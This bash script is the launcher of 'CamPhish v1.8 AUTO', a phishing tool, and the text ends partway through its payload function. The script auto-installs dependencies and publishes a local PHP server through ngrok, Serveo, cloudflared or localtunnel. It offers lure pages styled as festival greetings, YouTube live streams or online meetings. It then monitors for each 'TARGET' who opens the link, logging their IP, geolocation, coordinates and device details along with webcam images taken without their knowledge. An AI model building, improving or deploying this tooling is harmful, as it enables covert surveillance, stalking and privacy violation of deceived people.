#!/bin/bash
# CamPhish v1.8 AUTO - Fully Automatic Cross-Platform Version
# Powered by Irsyah / PAZ
# Auto-detect device, download tools, auto-fallback ngrok→Serveo
# Credits: thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

# ============================================================================
# Platform detection
try_localtunnel() {
	printf "\e[1;92m[+] Attempting LocalTunnel (npx/localtunnel)...\e[0m\n"
	if has_cmd lt; then
		LT_CMD="lt"
	elif has_cmd npx; then
		LT_CMD="npx localtunnel"
	else
		printf "\e[1;93m[!] localtunnel (lt) or npx not available\e[0m\n"
		return 1
	fi

	pkill -f "localtunnel" 2>/dev/null || true
	$LT_CMD --port 3333 > localtunnel.log 2>&1 &
	local lt_pid=$!

	local elapsed=0
	while [[ $elapsed -lt 8 ]]; do
		sleep 1
		elapsed=$((elapsed+1))
		if grep -q "your url is" localtunnel.log 2>/dev/null; then
			local url=$(grep -o "https://[a-z0-9.-]*\.loc\.lt\|https://[a-z0-9.-]*\.localtunnel\.me" localtunnel.log | head -n1 || true)
			if [[ -n "$url" ]]; then
				printf "\e[1;92m[✓] LocalTunnel ready: $url\e[0m\n"
				echo "$url"
				return 0
			fi
		fi
	done

	printf "\e[1;93m[!] LocalTunnel timeout or failed\e[0m\n"
	kill $lt_pid 2>/dev/null || true
	return 1
}

try_cloudflared() {
	printf "\e[1;92m[+] Attempting Cloudflare Tunnel (cloudflared)...\e[0m\n"
	if ! has_cmd cloudflared; then
		printf "\e[1;93m[!] cloudflared not installed\e[0m\n"
		return 1
	fi

	pkill -f "cloudflared" 2>/dev/null || true
	cloudflared tunnel --url http://127.0.0.1:3333 > cloudflared.log 2>&1 &
	local cf_pid=$!

	local elapsed=0
	while [[ $elapsed -lt 8 ]]; do
		sleep 1
		elapsed=$((elapsed+1))
		# cloudflared prints the public url in logs
		local url=$(grep -o "https://[a-z0-9.-]*" cloudflared.log | head -n1 || true)
		if [[ -n "$url" ]]; then
			printf "\e[1;92m[✓] cloudflared ready: $url\e[0m\n"
			echo "$url"
			return 0
		fi
	done

	printf "\e[1;93m[!] cloudflared timeout or failed\e[0m\n"
	kill $cf_pid 2>/dev/null || true
	return 1
}

# ============================================================================
PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
IS_DARWIN=false
IS_LINUX=false
IS_TERMUX=false
IS_WINDOWS=false

case "$PLATFORM" in
	Darwin*) IS_DARWIN=true ;; 
	Linux*) 
		IS_LINUX=true
		if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
			IS_TERMUX=true
		fi
		;;
	MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
	*) ;;
esac

# Check if running in WSL (warning for user since they want non-WSL solutions)
is_wsl() {
	if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
		return 0
	fi
	if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
		return 0
	fi
	return 1
}

# ============================================================================
# Utilities
# ============================================================================
has_cmd() { command -v "$1" >/dev/null 2>&1; }

kill_port() {
	port="$1"
	if has_cmd fuser; then
		fuser -k ${port}/tcp > /dev/null 2>&1 || true
		return
	fi
	if has_cmd lsof; then
		pids=$(lsof -t -i tcp:"${port}" 2>/dev/null || true)
		if [ -n "$pids" ]; then
			echo "$pids" | xargs -r kill -2 >/dev/null 2>&1 || true
			return
		fi
	fi
	if has_cmd netstat && has_cmd awk && has_cmd grep; then
		pid=$(netstat -nlp 2>/dev/null | grep ":${port} " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
		if [ -n "$pid" ]; then
			kill -2 "$pid" >/dev/null 2>&1 || true
			return
		fi
	fi
}

# ============================================================================
# Banner & Output
# ============================================================================
banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.8 AUTO \e[0m \n"
printf " \e[1;91m Tools Name : SAP-SAP.TOOLS > PAZ.Pemuda Akhir Zaman \e[0m \n"
printf " \e[1;92m Jika kau mencintainya , maka dekati dulu sang pencitanya :> \e[0m \n"
printf "\n"
}

# ============================================================================
# Dependencies: check and suggest installations
# ============================================================================
dependencies() {
	printf "\e[1;92m[*] Checking dependencies...\e[0m\n"
	local missing=0
	
	if ! has_cmd php; then
		echo >&2 "ERROR: php not found. Install php-cli."
		missing=1
	fi
	if ! has_cmd curl && ! has_cmd wget; then
		echo >&2 "WARNING: curl/wget not found. Some operations may fail."
	fi
	if ! has_cmd ssh && ! $IS_WINDOWS; then
		echo >&2 "WARNING: ssh not found. Serveo fallback will fail."
	fi
	
	if [ $missing -eq 1 ]; then
		printf "\e[1;93m[!] Install missing dependencies first.\e[0m\n"
		exit 1
	fi
	printf "\e[1;92m[✓] Dependencies OK\e[0m\n"
}

# ============================================================================
# Auto-install missing dependencies across platforms
# ============================================================================
auto_install_dependencies() {
	printf "\n\e[1;92m[*] Checking recommended dependencies and optional tools...\e[0m\n"

	# Lists of checks
	apt_pkgs=(php openssh-client openssh-server git wget espeak alsa-utils)
	pip_pkgs=(pyttsx3 colorama openpyxl uno systemd)
	other_bins=(cloudflared)

	missing_apt=()
	missing_pip=()
	missing_bin=()

	# Check basic binaries
	for pkg in "${apt_pkgs[@]}"; do
		case "$pkg" in
			php) has_cmd php || missing_apt+=(php) ;;
			openssh-client|openssh-server)
				has_cmd ssh || missing_apt+=(openssh-client) ;;
			git) has_cmd git || missing_apt+=(git) ;;
			wget) has_cmd wget || missing_apt+=(wget) ;;
			espeak) has_cmd espeak || missing_apt+=(espeak) ;;
			alsa-utils) has_cmd aplay || missing_apt+=(alsa-utils) ;;
			*) ;;
		esac
	done

	# Check python packages
	PY_CMD=""
	if has_cmd python3; then PY_CMD=python3; elif has_cmd python; then PY_CMD=python; fi
	for p in "${pip_pkgs[@]}"; do
		if [[ -n "$PY_CMD" ]]; then
			$PY_CMD -c "import ${p}" >/dev/null 2>&1 || missing_pip+=("$p")
		else
			missing_pip+=("$p")
		fi
	done

	# Check other binaries
	for b in "${other_bins[@]}"; do
		has_cmd $b || missing_bin+=("$b")
	done

	if [[ ${#missing_apt[@]} -eq 0 && ${#missing_pip[@]} -eq 0 && ${#missing_bin[@]} -eq 0 ]]; then
		printf "\e[1;92m[✓] All recommended tools appear present\e[0m\n"
		return 0
	fi

	printf "\n\e[1;93m[!] Missing components detected:\e[0m\n"
	if [[ ${#missing_apt[@]} -gt 0 ]]; then printf "  - apt packages: %s\n" "${missing_apt[*]}"; fi
	if [[ ${#missing_pip[@]} -gt 0 ]]; then printf "  - pip packages: %s\n" "${missing_pip[*]}"; fi
	if [[ ${#missing_bin[@]} -gt 0 ]]; then printf "  - other binaries: %s\n" "${missing_bin[*]}"; fi

	# If called with 'auto' parameter or NO_AUTO_INSTALL not set, proceed (non-interactive)
	if [[ "$1" == "auto" ]]; then
		printf "\e[1;92m[*] Auto-installing missing components (non-interactive)...\e[0m\n"
	else
		printf "\e[1;93m[?] Attempting to install missing components...\e[0m\n"
	fi

	# Determine package manager (avoid sudo if possible)
	SUDO=""
	# Only use sudo if: (1) not already root, and (2) sudo is available with passwordless access
	if [[ $EUID -ne 0 ]] && has_cmd sudo; then
		# Test if sudo works without password (non-interactive)
		if sudo -n true 2>/dev/null; then
			SUDO=sudo
		fi
	fi

	if has_cmd apt-get; then
		if [[ -n "$SUDO" ]]; then
			PKG_CMD="$SUDO apt-get -y install"
		else
			PKG_CMD="apt-get -y install"  # Try without sudo (may fail, that's OK)
		fi
	elif has_cmd pkg && grep -qi "com.termux" /proc/self/cgroup 2>/dev/null; then
		PKG_CMD="pkg install -y"
	elif has_cmd pacman; then
		if [[ -n "$SUDO" ]]; then
			PKG_CMD="$SUDO pacman -S --noconfirm"
		else
			PKG_CMD="pacman -S --noconfirm"
		fi
	elif has_cmd yum; then
		if [[ -n "$SUDO" ]]; then
			PKG_CMD="$SUDO yum -y install"
		else
			PKG_CMD="yum -y install"
		fi
	elif has_cmd brew; then
		PKG_CMD="brew install"
	elif $IS_WINDOWS; then
		if has_cmd choco; then
			PKG_CMD="choco install -y"
		else
			printf "\e[1;93m[!] No supported package manager (choco not found). Skipping system package install.\e[0m\n"
			PKG_CMD=""
		fi
	else
		PKG_CMD=""
	fi

	# Install apt-style packages (non-critical, silent fail)
	if [[ -n "$PKG_CMD" && ${#missing_apt[@]} -gt 0 ]]; then
		printf "\e[1;92m[+] Attempting to install system packages: %s\e[0m\n" "${missing_apt[*]}"
		$PKG_CMD ${missing_apt[*]} 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] System packages failed to install (non-critical)\e[0m\n"
	else
		if [[ ${#missing_apt[@]} -gt 0 ]] && [[ -z "$PKG_CMD" ]]; then
			printf "\e[1;93m[!] No package manager available - cannot install system packages: %s\e[0m\n" "${missing_apt[*]}"
		fi
	fi

	# Install pip packages (skip on Kali or systems with PEP 668 restrictions)
	if has_cmd pip3; then PIP_CMD="pip3"; elif has_cmd pip; then PIP_CMD="pip"; else PIP_CMD=""; fi
	if [[ -n "$PIP_CMD" && ${#missing_pip[@]} -gt 0 ]]; then
		# On Kali/PEP 668 systems, skip optional packages (pyttsx3, openpyxl, uno) 
		# and only try critical ones if any
		local pip_to_install=()
		for p in "${missing_pip[@]}"; do
			# Skip optional packages that cause PEP 668 errors on Kali
			if [[ "$p" == "pyttsx3" || "$p" == "openpyxl" || "$p" == "uno" ]]; then
				printf "\e[1;93m[!] Skipping optional pip package (may conflict on Kali): %s\e[0m\n" "$p"
				continue
			fi
			pip_to_install+=("$p")
		done
		
		if [[ ${#pip_to_install[@]} -gt 0 ]]; then
			printf "\e[1;92m[+] Installing Python packages: %s\e[0m\n" "${pip_to_install[*]}"
			$PIP_CMD install --user ${pip_to_install[*]} 2>&1 | tee -a install.log || printf "\e[1;93m[!] pip install may have failed (non-critical)\e[0m\n"
		fi
	fi

	# Try to install other binaries minimally (non-critical, silent fail)
	for b in "${missing_bin[@]}"; do
		if [[ "$b" == "cloudflared" ]]; then
			if has_cmd apt-get; then
				printf "\e[1;92m[+] Attempting cloudflared install (apt)...\e[0m\n"
				if [[ -n "$SUDO" ]]; then
					$SUDO apt-get -y install cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared apt install skipped (may not be in repos)\e[0m\n"
				else
					apt-get -y install cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared apt install skipped (may need sudo)\e[0m\n"
				fi
			elif has_cmd choco; then
				printf "\e[1;92m[+] Attempting cloudflared install (choco)...\e[0m\n"
				choco install -y cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared choco install skipped\e[0m\n"
			else
				printf "\e[1;93m[!] cloudflared not installed (install manually if needed)\e[0m\n"
			fi
		fi
	done

	printf "\e[1;92m[✓] Auto-install attempt finished (see install.log for details).\e[0m\n"
}

# ============================================================================
# Stop function
# ============================================================================
stop() {
	printf "\e[1;91m[!] Stopping services...\e[0m\n"
	pkill -f -2 ngrok > /dev/null 2>&1 || true
	pkill -f -2 php > /dev/null 2>&1 || true
	pkill -f -2 ssh > /dev/null 2>&1 || true
	killall -2 ngrok ngrok.exe php ssh > /dev/null 2>&1 || true
	exit 1
}

# ============================================================================
# Catch IP and Camera
# ============================================================================
catch_ip() {
	if [[ -f "ip.txt" ]]; then
		# Extract all data from ip.txt
		ip=$(grep -a 'IP ADDRESS:' ip.txt | head -1 | sed 's/.*IP ADDRESS: //g' | tr -d '\r' | xargs)
		geo=$(grep -a 'GEOLOCATION:' ip.txt | head -1 | sed 's/.*GEOLOCATION: //g' | tr -d '\r' | xargs)
		coords=$(grep -a 'COORDINATES:' ip.txt | head -1 | sed 's/.*COORDINATES: //g' | tr -d '\r' | xargs)
		os=$(grep -a 'OS:' ip.txt | head -1 | sed 's/.*OS: //g' | tr -d '\r' | xargs)
		browser=$(grep -a 'BROWSER:' ip.txt | head -1 | sed 's/.*BROWSER: //g' | tr -d '\r' | xargs)
		device_type=$(grep -a 'DEVICE TYPE:' ip.txt | head -1 | sed 's/.*DEVICE TYPE: //g' | tr -d '\r' | xargs)
		device_name=$(grep -a 'DEVICE NAME:' ip.txt | head -1 | sed 's/.*DEVICE NAME: //g' | tr -d '\r' | xargs)
		language=$(grep -a 'LANGUAGE:' ip.txt | head -1 | sed 's/.*LANGUAGE: //g' | tr -d '\r' | xargs)
		
		if [[ -n "$ip" ]]; then
			printf "\n\e[1;92m╔════════════════════════════════════════════════════════════════════╗\e[0m\n"
			printf "\e[1;92m║\e[0m\e[1;77m                      ✅ TARGET DETECTED ✅                      \e[0m\e[1;92m║\e[0m\n"
			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
			printf "\e[1;92m║\e[0m  \e[1;93m[+] IP ADDRESS: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$ip"
			printf "\e[1;92m║\e[0m  \e[1;93m[+] GEOLOCATION: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$geo"
			printf "\e[1;92m║\e[0m  \e[1;93m[+] COORDINATES: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$coords"
			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
			printf "\e[1;92m║\e[0m  \e[1;93m[DEVICE INFO]\e[0m\n"
			printf "\e[1;92m║\e[0m    • OS: \e[1;77m%-60s\e[0m\e[1;92m║\e[0m\n" "$os"
			printf "\e[1;92m║\e[0m    • Browser: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$browser"
			printf "\e[1;92m║\e[0m    • Device Type: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_type"
			printf "\e[1;92m║\e[0m    • Device Name: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_name"
			printf "\e[1;92m║\e[0m    • Language: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$language"
			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
			printf "\e[1;92m║\e[0m  \e[1;93m[+] Timestamp: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
			printf "\e[1;92m║\e[0m  \e[1;93m[+] Status: \e[1;77mLink Opened - Waiting for Camera\e[0m\e[1;92m║\e[0m\n"
			printf "\e[1;92m╚════════════════════════════════════════════════════════════════════╝\e[0m\n"
			cat ip.txt >> saved.ip.txt
		fi
	fi
}

catch_camera() {
	if [[ -f "Log.log" ]]; then
		# Extract filename from log
		filename=$(grep -a 'FILE:' Log.log | head -1 | sed 's/.*FILE: //g' | tr -d '\r' | xargs)
		size=$(grep -a 'SIZE:' Log.log | head -1 | sed 's/.*SIZE: //g' | tr -d '\r' | xargs)
		if [[ -n "$filename" ]]; then
			printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
			printf "\e[1;92m║\e[0m\e[1;77m                  📷 CAMERA CAPTURED 📷                    \e[0m\e[1;92m║\e[0m\n"
			printf "\e[1;92m���\e[0m                                                            \e[1;92m║\e[0m\n"
			printf "\e[1;92m║\e[0m  \e[1;93m[✓] File: \e[1;77m%-50s\e[0m\e[1;92m║\e[0m\n" "$filename"
			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Size: \e[1;77m%-50s\e[0m\e[1;92m║\e[0m\n" "$size"
			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Location: \e[1;77m../cam_*.png (Parent CamN folder)\e[0m\e[1;92m║\e[0m\n"
			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Timestamp: \e[1;77m%-45s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
			printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
			printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
		fi
	fi
}

checkfound() {
	printf "\n"
	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
	printf "\e[1;92m║\e[0m\e[1;77m           🔍 MONITORING FOR TARGETS 🔍                  \e[0m\e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m  Waiting for targets to open link...                      \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m  Press Ctrl+C to exit                                     \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m  📍 Log Locations:                                        \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m     • IP Logs: ip.txt, ip.json, saved.ip.txt              \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m     • Camera: Log.log, captures.json                      \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m     • Images: ../cam_*.png (Parent CamN folder)           \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
	printf "\n"
	
	while [ true ]; do
		if [[ -e "ip.txt" ]]; then
			catch_ip
			rm -rf ip.txt
		fi
		sleep 0.5
		if [[ -e "Log.log" ]]; then
			catch_camera
			rm -rf Log.log
		fi
		sleep 0.5
	done
}

# ============================================================================
# Auto-download ngrok for all platforms
# ============================================================================
setup_ngrok() {
	# Check if ngrok already exists
	if [[ -x ./ngrok ]] || [[ -x ./ngrok.exe ]]; then
		printf "\e[1;92m[✓] ngrok already available\e[0m\n"
		return 0
	fi

	printf "\e[1;92m[*] Setting up ngrok...\e[0m\n"

	# Detect platform and architecture
	local ngrok_url=""
	local ngrok_file=""

	# Windows
	if $IS_WINDOWS; then
		ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
		ngrok_file="ngrok-windows-amd64.zip"
	# macOS
	elif [[ "$OSTYPE" == "darwin"* ]] || [[ "$PLATFORM" == "Darwin"* ]]; then
		local arch=$(uname -m)
		if [[ "$arch" == "arm64" ]] || [[ "$arch" == "aarch64" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
			ngrok_file="ngrok-darwin-arm64.zip"
		else
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
			ngrok_file="ngrok-darwin-amd64.zip"
		fi
	# Linux / Termux
	else
		local arch=$(uname -m)
		if [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
			ngrok_file="ngrok-linux-arm64.zip"
		elif [[ "$arch" == "armv7l" ]] || [[ "$arch" == "armv7" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
			ngrok_file="ngrok-linux-arm.zip"
		else
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
			ngrok_file="ngrok-linux-amd64.zip"
		fi
	fi

	# Download
	printf "\e[1;92m[+] Downloading ngrok...\e[0m\n"
	if has_cmd curl; then
		curl -L --max-time 60 "$ngrok_url" -o "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] curl download failed\e[0m\n"; return 1; }
	elif has_cmd wget; then
		wget --no-check-certificate --timeout=60 "$ngrok_url" -O "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] wget download failed\e[0m\n"; return 1; }
	else
		printf "\e[1;31m[!] No curl/wget available\e[0m\n"
		return 1
	fi

	# Extract
	printf "\e[1;92m[+] Extracting...\e[0m\n"
	if [[ -f "$ngrok_file" ]]; then
		if has_cmd unzip; then
			unzip -q "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] unzip failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		elif has_cmd 7z; then
			7z x "$ngrok_file" > /dev/null 2>&1 || { printf "\e[1;31m[!] 7z failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		elif $IS_WINDOWS && has_cmd powershell; then
			powershell -Command "Expand-Archive -Path '$ngrok_file' -DestinationPath '.' -Force" 2>/dev/null || { printf "\e[1;31m[!] PowerShell extraction failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		else
			printf "\e[1;31m[!] No extraction tool (unzip/7z/PowerShell)\e[0m\n"
			rm -f "$ngrok_file"
			return 1
		fi
		chmod +x ngrok ngrok.exe 2>/dev/null || true
		rm -f "$ngrok_file"
		printf "\e[1;92m[✓] ngrok ready\e[0m\n"
		return 0
	else
		printf "\e[1;31m[!] Download incomplete\e[0m\n"
		return 1
	fi
}

# ============================================================================
# Configure ngrok authtoken
# ============================================================================
setup_ngrok_auth() {
	printf "\e[1;92m[*] Configuring ngrok authtoken...\e[0m\n"
	
	local NGROK_CMD=""
	if $IS_WINDOWS && [[ -x ./ngrok.exe ]]; then
		NGROK_CMD="./ngrok.exe"
	elif [[ -x ./ngrok ]]; then
		NGROK_CMD="./ngrok"
	elif has_cmd ngrok; then
		NGROK_CMD="ngrok"
	else
		printf "\e[1;93m[!] ngrok executable not found\e[0m\n"
		return 1
	fi

	if [[ -f ~/.ngrok2/ngrok.yml ]]; then
		printf "\e[1;93m[?] Existing ngrok token detected. Use it? [Y/n]: \e[0m"
		read token_choice
		token_choice="${token_choice:-Y}"
		if [[ "$token_choice" != "N" && "$token_choice" != "n" ]]; then
			printf "\e[1;92m[✓] Using existing token\e[0m\n"
			return 0
		fi
	fi

	printf "\e[1;92m[+] Enter your ngrok authtoken (from https://dashboard.ngrok.com): \e[0m"
	read ngrok_auth
	
	if [[ -n "$ngrok_auth" ]]; then
		$NGROK_CMD authtoken "$ngrok_auth" > /dev/null 2>&1
		sleep 1
		printf "\e[1;92m[✓] Authtoken configured\e[0m\n"
		return 0
	else
		printf "\e[1;93m[!] No token provided, will try Serveo fallback\e[0m\n"
		return 1
	fi
}

# ============================================================================
# Start ngrok tunnel
# ============================================================================
try_ngrok() {
	local NGROK_CMD=""
	
	# Find ngrok
	if $IS_WINDOWS && [[ -f ./ngrok.exe ]]; then
		NGROK_CMD="./ngrok.exe"
	elif [[ -f ./ngrok ]]; then
		NGROK_CMD="./ngrok"
	elif has_cmd ngrok; then
		NGROK_CMD="ngrok"
	else
		return 1
	fi

	printf "\e[1;92m[+] ngrok: starting (waiting up to 5 seconds): \e[0m"
	
	# Kill any existing ngrok
	pkill -f "ngrok http" 2>/dev/null || true
	sleep 1
	
	# Start ngrok with explicit logging
	$NGROK_CMD http 3333 --log=stdout > ngrok.log 2>&1 &
	local ngrok_pid=$!
	
	# Monitor for 5 seconds
	local elapsed=0
	local link=""
	
	while [[ $elapsed -lt 5 ]]; do
		sleep 1
		elapsed=$((elapsed+1))
		
		# Check if process alive
		if ! kill -0 $ngrok_pid 2>/dev/null; then
			printf "\n\e[1;31m[!] ngrok process crashed\e[0m\n"
			# Show ngrok error
			if [[ -s ngrok.log ]]; then
				printf "\e[1;93m[DEBUG] Last 5 lines of ngrok.log:\e[0m\n"
				tail -5 ngrok.log | sed 's/^/    /'
			fi
			return 1
		fi
		
		# Check for link
		link=$(grep -oP 'https://[A-Za-z0-9\-\.]+\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
		if [[ -n "$link" ]]; then
			printf "\e[1;92m ✓\e[0m\n"
			printf "\e[1;92m[✓] ngrok ready: $link\e[0m\n"
			echo "$link"
			return 0
		fi
		
		printf "."
	done
	
	# Timeout occurred
	printf "\n\e[1;31m[!] ngrok timeout (5 seconds elapsed)\e[0m\n"
	
	# Diagnose the issue
	if [[ -s ngrok.log ]]; then
		if grep -q "invalid auth token\|ERR_NGROK_401" ngrok.log; then
			printf "\e[1;31m[!] ERROR: Invalid or blocked ngrok token\e[0m\n"
			printf "\e[1;93m    Visit: https://dashboard.ngrok.com\e[0m\n"
		elif grep -q "Tunnel limit exceeded\|ERR_NGROK_403" ngrok.log; then
			printf "\e[1;31m[!] ERROR: Tunnel limit exceeded on ngrok account\e[0m\n"
		elif grep -q "ERR_NGROK" ngrok.log; then
			printf "\e[1;31m[!] ngrok error:\e[0m\n"
			grep "ERR_NGROK" ngrok.log | head -2 | sed 's/^/    /'
		else
			printf "\e[1;93m[!] ngrok output:\e[0m\n"
			tail -3 ngrok.log | sed 's/^/    /'
		fi
	fi
	
	kill $ngrok_pid 2>/dev/null || true
	wait $ngrok_pid 2>/dev/null || true
	return 1
}

# ============================================================================
# Start Serveo tunnel (fallback)
# ============================================================================
try_serveo() {
	if ! has_cmd ssh; then
		printf "\e[1;31m[✗] ssh not available - Serveo requires SSH\e[0m\n"
		return 1
	fi

	printf "\e[1;92m[+] serveo: starting SSH tunnel (max 10 seconds): \e[0m"

	local subdomain="cam$RANDOM"
	
	# Start SSH tunnel
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ConnectTimeout=5 \
		-R ${subdomain}:80:127.0.0.1:3333 serveo.net > sendlink 2>&1 &
	local ssh_pid=$!
	
	# Quick polling (3 seconds)
	local elapsed=0
	while [[ $elapsed -lt 3 ]]; do
		sleep 1
		elapsed=$((elapsed+1))
		printf "."
		
		# Check for link
		if [[ -f sendlink ]]; then
			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
			if [[ -n "$link" ]]; then
				printf "\e[1;92m ✓\e[0m\n"
				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
				echo "$link"
				return 0
			fi
		fi
	done
	
	# Extended wait (additional 7 seconds)
	while [[ $elapsed -lt 10 ]]; do
		sleep 1
		elapsed=$((elapsed+1))
		printf "."
		
		if [[ -f sendlink ]]; then
			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
			if [[ -n "$link" ]]; then
				printf "\e[1;92m ✓\e[0m\n"
				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
				echo "$link"
				return 0
			fi
		fi
	done
	
	# Timeout
	printf "\e[1;31m ✗\e[0m\n"
	printf "\e[1;31m[!] Serveo timeout (10 seconds elapsed)\e[0m\n"
	
	# Diagnose
	if [[ -f sendlink ]] && [[ -s sendlink ]]; then
		if grep -q "Connection refused\|Network is unreachable" sendlink; then
			printf "\e[1;31m[!] Network error: Cannot reach serveo.net\e[0m\n"
		elif grep -q "Timeout\|timed out" sendlink; then
			printf "\e[1;31m[!] Connection timeout to serveo.net\e[0m\n"
		else
			printf "\e[1;93m[DEBUG] SSH output (last 3 lines):\e[0m\n"
			tail -3 sendlink | sed 's/^/    /'
		fi
	fi
	
	kill $ssh_pid 2>/dev/null || true
	wait $ssh_pid 2>/dev/null || true
	return 1
}

# ============================================================================
# Setup templates
# ============================================================================
select_template() {
	printf "\n-----Choose template----\n"    
	printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
	printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
	printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
	
	printf "\e[1;92m[+] Choose: [Default 1] \e[0m"
	read option_tem
	option_tem="${option_tem:-1}"
	
	case $option_tem in
		1) read -p "Festival name: " fest_name; fest_name="${fest_name//[[:space:]]/}" ;;
		2) read -p "YouTube video ID: " yt_video_ID ;;
		3) printf "" ;;
		*) printf "\e[1;93m[!] Invalid choice\e[0m\n"; select_template; return ;;
	esac
}

payload() {
	# Create index.php from template (entry point that logs and redirects)
	cp template.php index.php

	# Escape URL for sed: escape / and & which are special in sed replacement
	# Remove any trailing newlines from link to prevent sed errors
	link=$(printf '%s' "$1" | tr -d '\n\r')
	link_esc=$(printf '%s' "$link" | sed -e 's/[\/&]/\\&/g')
	
	# Escape festival name and video ID for sed (remove newlines)
	fest_esc=$(printf '%s' "$fest_name" | tr -d '\n\r' | sed -e 's/[\/&]/\\&/g')
	vid_esc=$(printf '%s' "$yt_video_ID" | tr -d '\n\r' | sed -e 's/[\/&]/\\&/g')

	printf "\e[1;92m[+] Generating page template (option %d)...\e[0m\n" "$option_tem"

	case $option_tem in
		1)
			# Festival Wishing: replace forwarding_link and fes_name
			printf "\e[1;92m[+] Using: Festival Wishing (name: %s)\e[0m\n" "$fest_name"
			if ! sed -e "s|forwarding_link|$link_esc|g" festivalwishes.html > index3.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process forwarding_link\e[0m\n"
				return 1
			fi
